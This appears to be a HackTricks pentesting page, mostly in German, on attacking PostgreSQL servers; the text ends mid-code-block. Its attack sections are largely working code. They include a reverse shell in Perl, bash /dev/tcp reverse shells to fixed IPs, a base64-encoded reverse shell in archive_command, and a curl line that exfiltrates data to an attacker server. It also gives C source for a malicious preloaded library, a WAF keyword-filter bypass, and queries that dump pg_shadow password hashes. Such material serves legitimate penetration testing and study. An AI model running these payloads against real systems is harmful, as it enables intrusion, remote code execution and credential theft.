# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Grundlegende Informationen**

**PostgreSQL** wird als ein **objekt-relationales Datenbanksystem** beschrieben, das **Open Source** ist. Dieses System nutzt nicht nur die SQL-Sprache, sondern erweitert sie auch um zusätzliche Funktionen. Seine Fähigkeiten ermöglichen die Verarbeitung einer breiten Palette von Datentypen und Operationen, wodurch es eine vielseitige Wahl für Entwickler und Organisationen ist.

**Standardport:** 5432, und falls dieser Port bereits in Gebrauch ist, scheint PostgreSQL offenbar den nächsten Port (wahrscheinlich 5433) zu verwenden, der nicht belegt ist.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Verbinden & Grundlegende Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Wenn Sie **`\list`** ausführen und eine Datenbank namens **`rdsadmin`** finden, wissen Sie, dass Sie sich in einer **AWS postgresql database** befinden.

Für weitere Informationen darüber, **wie man eine PostgreSQL database missbraucht**, siehe:


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Automatische Enumeration
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Laut [**this research**](https://www.exploit-db.com/papers/13084) wirft `dblink`, wenn ein Verbindungsversuch fehlschlägt, eine `sqlclient_unable_to_establish_sqlconnection`-Ausnahme, die eine Erklärung des Fehlers enthält. Beispiele für diese Details sind unten aufgeführt.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host ist down

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port ist closed
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port ist offen
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
oder
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port ist offen oder gefiltert
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
In PL/pgSQL-Funktionen ist es derzeit nicht möglich, Ausnahme-Details zu erhalten. Wenn Sie jedoch direkten Zugriff auf den PostgreSQL-Server haben, können Sie die notwendigen Informationen abrufen. Falls das Auslesen von Usernamen und Passwörtern aus den Systemtabellen nicht möglich ist, können Sie die im vorhergehenden Abschnitt diskutierte wordlist attack-Methode in Betracht ziehen, da diese möglicherweise Erfolg bringt.

## Aufzählung der Privilegien

### Rollen

| Role Types     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rolle hat Superuser-Privilegien                                                                                                                      |
| rolinherit     | Rolle erbt automatisch die Privilegien der Rollen, deren Mitglied sie ist                                                                            |
| rolcreaterole  | Rolle kann weitere Rollen erstellen                                                                                                                 |
| rolcreatedb    | Rolle kann Datenbanken erstellen                                                                                                                    |
| rolcanlogin    | Rolle kann sich anmelden. Das heißt, diese Rolle kann als initialer Session-Authorization-Identifier verwendet werden                               |
| rolreplication | Rolle ist eine Replikationsrolle. Eine Replikationsrolle kann Replikationsverbindungen initiieren und Replikations-Slots erstellen und löschen.     |
| rolconnlimit   | Für Rollen, die sich anmelden können, legt dies die maximale Anzahl gleichzeitiger Verbindungen fest, die diese Rolle herstellen kann. -1 bedeutet keine Begrenzung. |
| rolpassword    | Nicht das Passwort (wird immer als `********` angezeigt)                                                                                             |
| rolvaliduntil  | Ablaufzeit des Passworts (nur für Passwort-Authentifizierung verwendet); null, wenn kein Ablauf vorhanden ist                                       |
| rolbypassrls   | Rolle umgeht jede Row-Level-Security-Policy, siehe [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) für mehr Informationen. |
| rolconfig      | Rollen-spezifische Standardwerte für Laufzeit-Konfigurationsvariablen                                                                               |
| oid            | ID der Rolle                                                                                                                                         |

#### Interessante Gruppen

- Wenn Sie Mitglied von **`pg_execute_server_program`** sind, können Sie **Programme ausführen**
- Wenn Sie Mitglied von **`pg_read_server_files`** sind, können Sie **Dateien lesen**
- Wenn Sie Mitglied von **`pg_write_server_files`** sind, können Sie **Dateien schreiben**

> [!TIP]
> Beachten Sie, dass in Postgres ein **user**, eine **group** und eine **role** dasselbe sind. Es hängt lediglich davon ab, **wie Sie sie verwenden** und ob Sie **ihnen erlauben, sich anzumelden**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabellen
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funktionen
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Dateisystem-Aktionen

### Verzeichnisse und Dateien lesen

Ab diesem [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) können Mitglieder der definierten **`DEFAULT_ROLE_READ_SERVER_FILES`**-Gruppe (genannt **`pg_read_server_files`**) und **Superuser** die **`COPY`**-Methode auf jedem Pfad verwenden (siehe `convert_and_check_filename` in `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Denk daran, dass wenn du kein super user bist, aber die Berechtigung **CREATEROLE** hast, du dich selbst Mitglied dieser Gruppe machen kannst:
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Es gibt **andere postgres-Funktionen**, die verwendet werden können, um **Dateien zu lesen oder ein Verzeichnis aufzulisten**. Nur **superusers** und **Benutzer mit expliziten Berechtigungen** können sie verwenden:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Sie finden **weitere Funktionen** in [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Einfaches Schreiben von Dateien

Nur **Superuser** und Mitglieder von **`pg_write_server_files`** können copy zum Schreiben von Dateien verwenden.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Beachte, dass wenn du kein Superuser bist, aber die **`CREATEROLE`**-Berechtigung besitzt, du **dich selbst Mitglied dieser Gruppe machen kannst:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Beachte, dass COPY keine Newline-Zeichen verarbeiten kann, daher musst du selbst bei Verwendung eines base64-Payloads eine Einzeilige senden.\
Eine sehr wichtige Einschränkung dieser Technik ist, dass **`copy` nicht verwendet werden kann, um Binärdateien zu schreiben, da es einige Binärwerte verändert.**

### **Binary files upload**

Es gibt jedoch **andere Techniken, um große Binärdateien hochzuladen:**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Aktualisieren von PostgreSQL-Tabellendaten durch lokales Dateischreiben

Wenn du die notwendigen Berechtigungen zum Lesen und Schreiben von PostgreSQL-Serverdateien hast, kannst du jede Tabelle auf dem Server aktualisieren, indem du den zugehörigen Filenode im [the PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html) überschreibst. **Mehr zu dieser Technik** [**here**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Erforderliche Schritte:

1.  Ermitteln des PostgreSQL data directory

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Hinweis:** Falls du den aktuellen Pfad des data directory nicht aus den settings abrufen kannst, kannst du die Major-Version von PostgreSQL mit der Abfrage `SELECT version()` ermitteln und versuchen, den Pfad zu brute-forcen. Gängige data directory-Pfade auf Unix-Installationen von PostgreSQL sind `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Ein üblicher Clustername ist `main`.

2.  Erhalte einen relativen Pfad zum Filenode, das mit der Ziel-Tabelle verknüpft ist

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Diese Abfrage sollte etwas wie `base/3/1337` zurückgeben. Der vollständige Pfad auf der Festplatte wäre `$DATA_DIRECTORY/base/3/1337`, also `/var/lib/postgresql/13/main/base/3/1337`.

3.  Lade den Filenode über die `lo_*`-Funktionen herunter

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Ermittle den Datentyp, der mit der Ziel-Tabelle verbunden ist

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Verwende den [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) um [edit the filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); setze alle `rol*`-Booleschen Flags auf 1, um volle Berechtigungen zu erhalten.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Lade den bearbeiteten Filenode über die `lo_*`-Funktionen wieder hoch und überschreibe die Originaldatei auf der Festplatte

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Optional)_ Leere den In-Memory-Table-Cache, indem du eine aufwändige SQL-Abfrage ausführst

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Du solltest nun die aktualisierten Tabellenwerte in PostgreSQL sehen.

Du kannst auch Superadmin werden, indem du die Tabelle `pg_authid` bearbeitest. **Siehe** [**the following section**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE to program**

Since[ version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), only **super users** and member of the group **`pg_execute_server_program`** can use copy for RCE (example with exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Beispiel zum exec:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Denke daran, dass wenn du kein Superuser bist, aber die **`CREATEROLE`**-Berechtigung hast, du dich **Mitglied dieser Gruppe machen kannst:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Oder verwende das `multi/postgres/postgres_copy_from_program_cmd_exec` Modul von **metasploit**.\
Mehr Informationen zu dieser Schwachstelle [**here**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Obwohl es als CVE-2019-9193 gemeldet wurde, erklärte Postgres, dass dies ein [feature and will not be fixed](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Bypass keyword filters/WAF to reach COPY PROGRAM

In SQLi-Kontexten mit gestapelten Abfragen kann ein WAF das Literal `COPY` entfernen oder blockieren. Du kannst die Anweisung dynamisch zusammenbauen und innerhalb eines PL/pgSQL DO-Blocks ausführen. Beispielsweise baue das führende C mit `CHR(67)` auf, um naive Filter zu umgehen, und EXECUTE die zusammengesetzte Anweisung:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
Dieses Muster umgeht statische Keyword-Filter und erreicht dennoch OS-Befehlsausführung via `COPY ... PROGRAM`. Es ist besonders nützlich, wenn die Anwendung SQL-Fehler ausgibt und stacked queries erlaubt.

### RCE mit PostgreSQL-Sprachen


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE mit PostgreSQL-Erweiterungen

Sobald Sie im vorherigen Beitrag **gelernt** haben, **wie man Binärdateien hochlädt**, können Sie versuchen, **RCE zu erlangen, indem Sie eine postgresql extension hochladen und laden**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### RCE über die PostgreSQL-Konfigurationsdatei

> [!TIP]
> Die folgenden RCE-Vektoren sind besonders nützlich in eingeschränkten SQLi-Kontexten, da alle Schritte über verschachtelte SELECT-Anweisungen ausgeführt werden können

Die **Konfigurationsdatei** von PostgreSQL ist vom **postgres user** **schreibbar**, dieser betreibt die Datenbank, sodass Sie als **superuser** Dateien im Dateisystem schreiben und daher diese Datei **überschreiben** können.

![](<../images/image (322).png>)

#### **RCE mit ssl_passphrase_command**

Mehr Informationen [über diese Technik hier](https://pulsesecurity.co.nz/articles/postgres-sqli).

Die Konfigurationsdatei hat einige interessante Attribute, die zu RCE führen können:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Pfad zum privaten Schlüssel der Datenbank
- `ssl_passphrase_command = ''` Wenn die private Datei durch ein Passwort (verschlüsselt) geschützt ist, wird postgresql den in diesem Attribut angegebenen Befehl **ausführen**.
- `ssl_passphrase_command_supports_reload = off` **Wenn** dieses Attribut **on** ist, wird der **Befehl**, falls der Schlüssel durch ein Passwort geschützt ist, beim Ausführen von `pg_reload_conf()` **ausgeführt**.

Dann muss ein Angreifer:

1. **Privaten Schlüssel dumpen** vom Server
2. **Verschlüsseln** des heruntergeladenen privaten Schlüssels:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Überschreiben**
4. **Die aktuelle postgresql Konfiguration dumpen**
5. **Die Konfiguration** mit den genannten Attributen überschreiben:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()` ausführen

Bei Tests habe ich bemerkt, dass dies nur funktioniert, wenn die **private Schlüsseldatei die Berechtigungen 640 hat**, sie **root gehört** und zur **Gruppe ssl-cert oder postgres** gehört (sodass der postgres user sie lesen kann), und sie sich in _/var/lib/postgresql/12/main_ befindet.

#### **RCE mit archive_command**

Mehr [**Informationen zu dieser Konfiguration und zu WAL hier**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3).

Ein weiteres Attribut in der Konfigurationsdatei, das ausnutzbar ist, ist `archive_command`.

Damit dies funktioniert, muss die Einstellung `archive_mode` auf `'on'` oder `'always'` stehen. Ist das der Fall, könnten wir den Befehl in `archive_command` überschreiben und ihn über WAL-Operationen (write-ahead logging) zur Ausführung bringen.

Die allgemeinen Schritte sind:

1. Prüfen, ob archive mode aktiviert ist: `SELECT current_setting('archive_mode')`
2. `archive_command` mit dem Payload überschreiben. Z. B. eine Reverse-Shell: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RELU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Die Konfiguration neu laden: `SELECT pg_reload_conf()`
4. Die WAL-Operation erzwingen, die den archive command aufruft: `SELECT pg_switch_wal()` oder `SELECT pg_switch_xlog()` für einige Postgres-Versionen

##### Bearbeiten von postgresql.conf via Large Objects (SQLi-freundlich)

Wenn mehrzeilige Schreibvorgänge erforderlich sind (z. B. um mehrere GUCs zu setzen), verwenden Sie PostgreSQL Large Objects, um die Konfiguration vollständig aus SQL zu lesen und zu überschreiben. Dieser Ansatz ist ideal in SQLi-Kontexten, in denen `COPY` keine Newlines oder binärsicheren Schreibvorgänge verarbeiten kann.

Beispiel (passen Sie bei Bedarf die Hauptversion und den Pfad an, z. B. Version 15 auf Debian):
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
This yields reliable OS command execution via `archive_command` as the `postgres` user, provided `archive_mode` is enabled. In practice, setting a low `archive_timeout` can cause rapid invocation without requiring an explicit WAL switch.

#### **RCE with preload libraries**

Mehr Informationen zu dieser Technik [hier](https://adeadfed.com/posts/postgresql-select-only-rce/).

This attack vector takes advantage of the following configuration variables:

- `session_preload_libraries` -- Bibliotheken, die vom PostgreSQL-Server bei der Client-Verbindung geladen werden.
- `dynamic_library_path` -- Liste von Verzeichnissen, in denen der PostgreSQL-Server nach Bibliotheken sucht.

We can set the `dynamic_library_path` value to a directory, writable by the `postgres` user running the database, e.g., `/tmp/` directory, and upload a malicious `.so` object there. Next, we will force the PostgreSQL server to load our newly uploaded library by including it in the `session_preload_libraries` variable.

The attack steps are:

1. Download the original `postgresql.conf`
2. Include the `/tmp/` directory in the `dynamic_library_path` value, e.g. `dynamic_library_path = '/tmp:$libdir'`
3. Include the malicious library name in the `session_preload_libraries` value, e.g. `session_preload_libraries = 'payload.so'`
4. Check major PostgreSQL version via the `SELECT version()` query
5. Compile the malicious library code with the correct PostgreSQL dev package Sample code:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compiling the code:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Upload the malicious `postgresql.conf`, created in steps 2-3, and overwrite the original one
7. Upload the `payload.so` from step 5 to the `/tmp` directory
8. Reload the server configuration by restarting the server or invoking the `SELECT pg_reload_conf()` query
9. At the next DB connection, you will receive the reverse shell connection.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

According to the [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _Rollen, die das **`CREATEROLE`**-Privileg haben, können die Mitgliedschaft in jeder Rolle gewähren oder entziehen, die **kein** Superuser ist._

So, if you have **`CREATEROLE`** permission you could grant yourself access to other **roles** (that aren't superuser) that can give you the option to read & write files and execute commands:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Passwort ändern

Benutzer mit dieser Rolle können außerdem die **Passwörter** anderer **Nicht-Superuser** **ändern**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Es ist ziemlich häufig, dass **lokale Benutzer sich bei PostgreSQL anmelden können, ohne ein Passwort anzugeben**. Daher können Sie, sobald Sie **Berechtigungen zur Ausführung von Code** erlangt haben, diese ausnutzen, um sich die **`SUPERUSER`**-Rolle zu verschaffen:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Dies ist normalerweise möglich wegen der folgenden Zeilen in der **`pg_hba.conf`**-Datei:
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

In [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) wird erklärt, wie es möglich war, in Postgres GCP eine **privesc** zu erreichen, indem die dem Benutzer gewährte ALTER TABLE-Berechtigung ausgenutzt wurde.

Wenn man versucht, **einen anderen Benutzer zum Eigentümer einer Tabelle zu machen**, sollte ein **Fehler** auftreten, der dies verhindert, aber offenbar gab GCP dem postgres-Benutzer, der kein Superuser war, diese **Option**:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Wenn man diese Idee mit der Tatsache verbindet, dass beim Ausführen der Befehle **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) auf einer **Tabelle mit einer Index-Funktion** die **Funktion** als Teil des Befehls mit den Rechten des **Tabellenbesitzers** aufgerufen wird, ist es möglich, einen Index mit einer Funktion zu erstellen und einem **Superuser** Besitzrechte an dieser Tabelle zu geben; anschließend kann man ANALYZE für die Tabelle mit der bösartigen Funktion ausführen, die dann Befehle ausführen kann, weil sie die Privilegien des Besitzers nutzt.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Erstellen Sie zunächst eine neue Tabelle.
2. Fügen Sie irrelevante Inhalte in die Tabelle ein, um Daten für die Index-Funktion bereitzustellen.
3. Entwickeln Sie eine bösartige Index-Funktion, die eine Payload zur Codeausführung enthält und so die Ausführung unautorisierter Befehle ermöglicht.
4. ALTER den Besitzer der Tabelle auf "cloudsqladmin", die Superuser-Rolle von GCP, die ausschließlich von Cloud SQL zur Verwaltung und Wartung der Datenbank verwendet wird.
5. Führen Sie eine ANALYZE-Operation auf der Tabelle aus. Diese Aktion zwingt die PostgreSQL-Engine dazu, in den Benutzerkontext des Tabellenbesitzers "cloudsqladmin" zu wechseln. Folglich wird die bösartige Index-Funktion mit den Rechten von "cloudsqladmin" aufgerufen, wodurch die Ausführung des zuvor unautorisierten Shell-Befehls ermöglicht wird.

In PostgreSQL sieht dieser Ablauf in etwa wie folgt aus:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Dann enthält die Tabelle `shell_commands_results` die Ausgabe des ausgeführten Codes:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Lokaler Login

Einige fehlkonfigurierte postgresql-Instanzen könnten die Anmeldung jedes lokalen Benutzers erlauben. Es ist möglich, sich von 127.0.0.1 aus über die **`dblink`-Funktion** anzumelden:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Beachte, dass für die vorherige Abfrage **die Funktion `dblink` existieren muss**. Falls sie nicht existiert, kannst du versuchen, sie mit
>
> ```sql
> CREATE EXTENSION dblink;
> ```
>
> zu erstellen.

Wenn du das Passwort eines Benutzers mit mehr Rechten hast, dieser Benutzer sich jedoch nicht von einer externen IP einloggen darf, kannst du die folgende Funktion verwenden, um Abfragen als dieser Benutzer auszuführen:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Es ist möglich zu prüfen, ob diese Funktion existiert mit:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Benutzerdefinierte Funktion mit** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters konnten in einer von IBM bereitgestellten postgres-Instanz privesc durchführen, weil sie **diese Funktion mit dem SECURITY DEFINER-Flag gefunden haben**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
